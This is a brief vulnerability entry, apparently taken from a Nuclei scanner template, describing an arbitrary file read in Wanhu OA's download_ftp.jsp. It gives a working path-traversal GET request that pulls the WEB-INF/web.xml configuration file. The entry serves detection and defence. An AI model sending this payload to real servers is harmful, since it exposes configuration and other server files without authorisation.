# Vulnerability: Wanhu OA download_ftp.jsp - Arbitrary File Read
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`wanhu-download-ftp-file-read.yaml`)

## Description
There is an arbitrary file download vulnerability in the Wanhu OA download_ftp.jsp file. An attacker can download any file on the server through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml
```

